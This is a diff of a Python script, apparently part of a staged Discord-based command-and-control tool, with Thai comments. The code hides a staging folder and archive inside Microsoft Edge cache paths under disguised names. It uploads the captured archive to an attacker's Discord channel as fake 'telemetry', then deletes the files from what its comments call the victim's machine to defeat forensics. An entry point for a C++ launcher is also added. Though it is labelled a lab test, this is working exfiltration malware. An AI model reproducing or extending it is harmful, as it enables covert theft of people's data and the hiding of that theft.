@@ -1,12 +1,16 @@
-# phase5_c2.py (เวอร์ชันสำหรับกดทดสอบในแล็บ - บันทึกเสร็จส่งทันที)
+# phase5_c2.py (เวอร์ชันสำหรับกดทดสอบในแล็บ - บันทึกเสร็จส่งของทันที)
 import discord
 import os
 import asyncio
 from datetime import datetime
 
+# =========================================================================
+# [ 🧼 💡 กลไกพรางตาพิกัดซ่อนเร้นลึก (Advanced Path Stealth Setup) ]
+# =========================================================================
 local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
 TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
 ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp")
+# =========================================================================
 
 class C2Exfiltrator(discord.Client):
     def __init__(self, channel_id, *args, **kwargs):
@@ -19,7 +23,7 @@ class C2Exfiltrator(discord.Client):
             await self.close()
             return
         
-        # ส่งข้อความเปิดท่อสัญญาณแจ้งคุณทาง Discord ทันที
+        # ส่งข้อความเปิดท่อสัญญาณแจ้งคุณทาง Discord ทันทีแบบพรางสายตา
         await channel.send(content="⚡ **[Lab Test Action] Telemetry data captured! Exfiltrating payload packet immediately...**")
         
         # 📦 ลำเลียงไฟล์มัดรวมหลักฐาน .tmp ที่พึ่งบันทึกเสร็จสดๆ ร้อนๆ ส่งขึ้น Discord C2 ของคุณ
@@ -29,11 +33,13 @@ class C2Exfiltrator(discord.Client):
                     discord_file = discord.File(f, filename="ms_edge_telemetry_v14.dat")
                     await channel.send(content="📦 **[Exfiltration Connected] ลำเลียงชิ้นส่วนข้อมูลลับระบบประจำวันสำเร็จ:**", file=discord_file)
             except Exception as e:
-                await channel.send(content=f"❌ *เกิดข้อผิดพลาดในการส่งไฟล์: {e}*")
+                try: await channel.send(content=f"❌ *เกิดข้อผิดพลาดในการส่งไฟล์: {e}*")
+                except: pass
 
         # 🧼 กลไกทำลายหลักฐานลบคม (Anti-Forensics) กวาดล้างเศษไฟล์บนดิสก์เครื่องเหยื่อทิ้งหมดจด
         try:
-            if os.path.exists(ZIP_PATH): os.remove(ZIP_PATH)
+            if os.path.exists(ZIP_PATH): 
+                os.remove(ZIP_PATH)
             if os.path.exists(TARGET_DIR):
                 for file_name in os.listdir(TARGET_DIR):
                     os.remove(os.path.join(TARGET_DIR, file_name))
@@ -48,8 +54,11 @@ async def wait_for_stealth_time():
     await asyncio.sleep(1) # หน่วงเวลาสั้นๆ 1 วินาทีพอเป็นพิธี แล้วปล่อยผ่านเลย
     return
 
-def start_c2_exfiltration(token_str, channel_id_int):
-    # วิ่งทะลุผ่านลูปหน่วงเวลาจำลองรวดเร็ว
+# =========================================================================
+# [ 🛠️ ประตูเชื่อมต่อเชื่อมสายข้ามมิติ - รองรับการเรียกสั่งจุดระเบิดจากฝั่ง C++ ]
+# =========================================================================
+def main_entry(token_str, channel_id_int):
+    # วิ่งทะลุผ่านลูปหน่วงเวลาจำลองรวดเร็วข้ามคิวรอเวลาดึก
     asyncio.run(wait_for_stealth_time())
     
     intents = discord.Intents.all()
